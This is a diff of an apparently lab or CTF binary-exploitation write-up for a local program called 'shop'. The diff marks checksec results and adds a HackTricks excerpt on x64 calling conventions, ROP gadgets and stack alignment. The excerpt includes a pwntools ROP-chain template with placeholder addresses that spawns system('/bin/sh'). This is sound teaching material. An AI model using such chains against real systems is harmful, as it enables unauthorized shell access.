@@ -1007,7 +1007,7 @@ laddr    0x0
 lang     c ←
 linenum  true
 lsyms    true
-machine  AMD x86-64 architecture
+machine  AMD x86-64 architecture ←
 nx       true ←
 os       linux
 pic      false
@@ -1024,7 +1024,7 @@ va       true ←
 `pwn checksec ./shop`:
 ```
 [*] '/home/kali/shop'
-    Arch:     amd64-64-little
+    Arch:     amd64-64-little ←
     RELRO:    Partial RELRO
     Stack:    No canary found ←
     NX:       NX enabled ←
@@ -1057,6 +1057,72 @@ cat /proc/sys/kernel/randomize_va_space
 ```
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+
+<div>
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
+</div>
+
+[ROP](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing)
+
+[**#x64 (64-bit) Calling conventions**]
+
+- Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in the registers** `**RDI**`**,** `**RSI**`**,** `**RDX**`**,** `**RCX**`**,** `**R8**`**, and** `**R9**`. Additional arguments are passed on the stack. The return value is placed in `RAX`.
+- **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
+- **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.
+
+[**#Finding Gadgets**]
+
+For our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **"/bin/sh"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified the following gadgets:
+- **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential for setting our argument for **system()**.
+- **ret**: A simple return, useful for stack alignment in some scenarios.
+And we know the address of the **system()** function.
+
+[**#ROP Chain**]
+
+Below is an example using **pwntools** to set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:
+```python
+from pwn import *
+
+# Assuming we have the binary's ELF and its process
+binary = context.binary = ELF('your_binary_here')
+p = process(binary.path)
+
+# Find the address of the string "/bin/sh" in the binary
+bin_sh_addr = next(binary.search(b'/bin/sh\x00'))
+
+# Address of system() function (hypothetical value)
+system_addr = 0xdeadbeefdeadbeef
+
+# Gadgets (hypothetical values)
+pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
+ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary
+
+# Construct the ROP chain
+rop_chain = [
+    ret_gadget,        # Alignment gadget, if needed
+    pop_rdi_gadget,    # pop rdi; ret
+    bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
+    system_addr        # Address of system(). Execution will continue here.
+]
+
+# Flatten the rop_chain for use
+rop_chain = b''.join(p64(addr) for addr in rop_chain)
+
+# Send ROP chain
+## offset is the number of bytes required to reach the return address on the stack
+payload = fit({offset: rop_chain})
+p.sendline(payload)
+p.interactive()
+```
+In this example:
+- We utilize the `**pop rdi; ret**` gadget to set `**RDI**` to the address of `**"/bin/sh"**`.
+- We directly jump to `**system()**` after setting `**RDI**`, with **system()**'s address in the chain.
+- `**ret_gadget**` is used for alignment if the target environment requires it, which is more common in **x64** to ensure proper stack alignment before calling functions.
+
+[**#Stack Alignment**]
+
+**The x86-64 ABI** ensures that the **stack is 16-byte aligned** when a **call instruction** is executed. **LIBC**, to optimize performance, **uses SSE instructions** (like **movaps**) which require this alignment. If the stack isn't aligned properly (meaning **RSP** isn't a multiple of 16), calls to functions like **system** will fail in a **ROP chain**. To fix this, simply add a **ret gadget** before calling **system** in your ROP chain.
 
 `gdb ./shop`
 
